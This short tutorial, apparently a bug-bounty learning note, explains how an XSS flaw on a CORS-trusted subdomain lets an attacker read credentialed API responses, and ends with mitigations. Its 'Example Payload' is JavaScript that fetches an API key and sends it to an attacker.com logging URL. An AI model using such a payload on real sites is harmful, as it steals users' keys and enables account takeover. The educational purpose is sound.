# Exploiting XSS via Trusted CORS Relationships

## Overview

A CORS configuration may appear secure because it only trusts specific origins.

However, if one of those trusted origins contains an XSS vulnerability, attackers can execute JavaScript from that trusted origin and abuse the CORS trust relationship.

---

# Scenario

Trusted Origin

```
https://sub.example.com
```

↓

Contains XSS

↓

Attacker Executes JavaScript

↓

CORS Request

↓

Sensitive Data Returned

---

# Example

Request

```http
GET /api/requestApiKey HTTP/1.1

Origin: https://sub.example.com
```

Response

```http
HTTP/1.1 200 OK

Access-Control-Allow-Origin:
https://sub.example.com

Access-Control-Allow-Credentials: true
```

The server correctly trusts the subdomain.

If that subdomain is vulnerable to XSS, an attacker can run arbitrary JavaScript that accesses the protected API.

---

# Attack Chain

```
XSS

↓

Trusted Origin

↓

Credentialed CORS Request

↓

Sensitive Response

↓

Attacker
```

---

# Example Payload

```javascript
fetch("https://victim.com/api/requestApiKey",{
credentials:"include"
})
.then(r=>r.text())
.then(d=>{
location="https://attacker.com/log?d="+encodeURIComponent(d);
});
```

---

# Why It Works

The browser sees the request coming from a trusted origin, so it allows the response to be read.

The attacker abuses the XSS vulnerability to execute the request from that trusted origin.

---

# Bug Bounty Perspective

Whenever a domain is trusted by CORS:

- Test it for XSS.
- Test its subdomains.
- Inspect legacy applications.
- Check staging and development environments.

A low-severity XSS can become a high-severity account takeover when combined with CORS.

---

# Mitigation

- Remove vulnerable origins from the allowlist.
- Regularly audit trusted domains.
- Prevent XSS.
- Apply Content Security Policy (CSP).

---

# Key Learnings

CORS trust relationships are only as secure as the trusted origins. An XSS vulnerability on a trusted origin can compromise the security of every application that trusts it.